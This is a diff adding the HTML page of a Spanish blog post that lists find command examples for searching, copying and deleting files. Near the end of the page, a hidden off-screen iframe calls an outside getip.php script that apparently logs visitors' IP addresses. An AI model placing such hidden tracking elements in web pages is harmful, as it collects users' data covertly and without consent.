@@ -1,0 +1,327 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>find - TRACTATUS ELEMENTALIS</title>
+  <meta name="author" content="templix">
+
+  
+  <meta name="description" content="Buscar archivos o directorios $ find / -iname archivo (Busca en / archivo sin distinguir minusculas y mayusculas) $ find /home -name *.png -print ( &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="https://tractatuslapipaplena.herokuapp.com/blog/find">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="TRACTATUS ELEMENTALIS" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <script src="/javascripts/links.js"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <div align=center>
+  <h1><a href="/">TRACTATUS ELEMENTALIS</a></h1>
+  
+    <h2>Apuntes sobre bash. Orgasmos con la terminal.</h2>
+  </dev>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS"></a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search?q=site%3Atractatuslapipaplena.herokuapp.com&q=" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:tractatuslapipaplena.herokuapp.com" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/previa">Previa</a></li>
+  <li><a href="/">Últimas</a></li>
+  <li><a href="/blog/archives">Todas</a></li>
+  <li><a href="/scripts">Scripts</a></li>
+  <li><a href="http://www.lapipaplena.net">Web</a></li>
+  <li><a href="http://lapipaplena.no-ip.org/wiki/">Wiki</a></li>
+  <li><a href="http://anonops.es">Foro</a></li>
+  <li><a href="http://panellpipa.no-ip.org">Socios</a></li>
+
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Find</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-07-13T16:49:00+02:00" pubdate data-updated="true">13-07-2013</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Buscar archivos o directorios</p>
+
+<blockquote><p>$ find / -iname archivo     (Busca en / archivo sin distinguir minusculas y mayusculas)</p>
+
+<p>$ find /home -name *.png -print      (Buscará en /home todos los archivos “.png” y mostrará la ruta)</p>
+
+<p>$ find . -name &#8220;*.bak&#8221; -exec rm {} \; (buscará en el directorio todos los acabados en .bak y los borrará. la instrucción &#8220;-exec&#8221; seguido del comando a ejecutar. los corchetes {} se refiere a los ficheros que find ha encontrado y la barra invertida seguido de punto y coma \; indica el final de la instrucción)</p>
+
+<p>$ find . ! -iname “<em>.png” ! -name “</em>.jpg”  (Buscar en el directorio actual todos los archivos menos los acabados en png y jpg)</p>
+
+<p>$ find . -amin -15 (Buscar los que se ha accedido en los últimos 15 minutos)</p>
+
+<p>$ find . -atime 15 (Buscar los que se accedió por última vez hace 15 dias)</p>
+
+<p>$ find / -amin -10 (Los que se ha accedido los últimos 10 minutos)</p>
+
+<p>$ find . -type f  (Buscar ficheros)</p>
+
+<p>$ find . -type d  (Buscar directorios)</p>
+
+<p>$ find / -iname fichero 2>/dev/null  (buscar redireccionando los avisos de permiso denegado a /dev/null)</p>
+
+<p>$ find . -iname &#8221;<em>.txt&#8221; -or -iname &#8221;</em>.odt&#8221; -exec cp {} documentos \; (Buscar los txt y los odt y copiarlos a la carpeta documentos)</p>
+
+<p>$ find . -type f -iname &#8220;*.bak&#8221; | xargs rm (buscar los ficheros acabados en .bak y borrarlos. xargs hace lo mismo que exec pero usando una tuberia.)</p>
+
+<p>$ find . -type f -iname *.sla (buscará los ficheros .sla)</p>
+
+<p>$ find . -type f -mtime 0 (Buscará los ficheros creados o modificados hoy)</p>
+
+<p>$ find / -type f -mtime -1 -print (Los modificados las últimas 24 horas)</p>
+
+<p>$ find / -mtime +2 -print (Los modificados hace más de dos dias)</p>
+
+<p>$ find -L . -type l  (Buscar enlaces rotos)</p>
+
+<p>$ find . -type f -size +300k > masde300k.txt (buscar .sh mayores de 300k)</p>
+
+<p>$ find ./ -name .svn -exec rm -rf {} \; (eliminar todos los directorios y subdirectorios subversión)</p>
+
+<p>$ find . -name &#8220;*.html&#8221; -exec grep -i -H &#8220;Tractatus elementalis&#8221; {} \; (Buscar en todos los archivos html del directorio actual con un texto concreto)</p>
+
+<p>$ find . -name *.txt -exec sed -i &#8220;s/cosa/casa/g&#8221; {} \; (Substituir “cosa” por “casa” en todos los .txt del presente directorio)</p>
+
+<p>$ find ~/ -depth -type f -empty (Buscar archivos vacios. Con -type d buscará directorios vacios)</p></blockquote>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Escrito por <span class="fn">templix</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-07-13T16:49:00+02:00" pubdate data-updated="true">13-07-2013</time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="https://tractatuslapipaplena.herokuapp.com/blog/find/" data-via="" data-counturl="https://tractatuslapipaplena.herokuapp.com/blog/find/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/finch/" title="Previous Post: finch">&laquo; finch</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/findfs/" title="Next Post: findfs">findfs &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+<h1>Número de entradas</h1>
+	<ul>
+	<li>1213</li>
+	</ul>
+</section>
+<section>
+  <h1>Añadidos/modificados</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/owncloud/">owncloud</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/golismero/">golismero</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/curl/">curl</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/lorem/">lorem</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/kernel/">kernel</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/yacy/">yacy</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/virtualbox/">virtualbox</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/miniflux/">miniflux</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/expresiones-regulares/">expresiones-regulares</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/sed/">sed</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>Sobre mi</h1> 
+  <center>
+  <img src="/images/linux_user.png" title="Linux user">
+  </center>
+  <p>Soy un /dev de lo más normal, con ciertas deficiencias en el xorg.conf como casi todo el mundo, con una apariencia común tirando a gráfica VGA y con algún pixel algo deteriorado y que vivirá hasta que su directorio / sufra un kernel pánic y me mande a /dev/null</p>
+</section>
+
+<section class="googleplus">
+  <h1>
+    <a href="https://plus.google.com/107431970267257491799?rel=author">
+      <img src="http://www.google.com/images/icons/ui/gprofile_button-32.png" width="32" height="32">
+      Google+
+    </a>
+  </h1>
+</section>
+
+
+<section>
+  <h1>Blogs útiles</h1>
+  <ul>
+      <li><a href="http://distrowatch.com">Distrowatch</a></li>
+      <li><a href="http://es.wikipedia.org/wiki/Lista_de_n%C3%BAmeros_de_puerto">Listado de puertos</a></li>
+      <li><a href="http://livecdlist.com/">LiveCDs</a></li>
+      <li><a href="https://murmuring-brook-6695.herokuapp.com/">Perseosblog</a><li>
+   </ul>
+</section>
+<section>
+<table border="0" cellspacing="0" cellpadding="0"><tr><td align="center"><script type="text/javascript" src="http://www.worldtimeserver.com/clocks/embed.js"></script><script type="text/javascript" language="JavaScript">objES=new Object;objES.wtsclock="wtsclock001.swf";objES.color="CC6600";objES.wtsid="ES";objES.width=200;objES.height=200;objES.wmode="transparent";showClock(objES);</script></td></tr></table>
+</section>
+<section>
+	<h1>IP visitante</h1>
+	<script type="text/javascript" src="http://boastology.com/tools/ip2c/?im=0&cn=0&ip=1"></script>
+</section>
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - templix -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+<div style="width: 1px; height: 1px; overflow: hidden; position: absolute; left: -1000px">
+<iframe src="http://crontux.homelinux.com/getip.php"></iframe>
+</div>
+
+</body>
+</html>
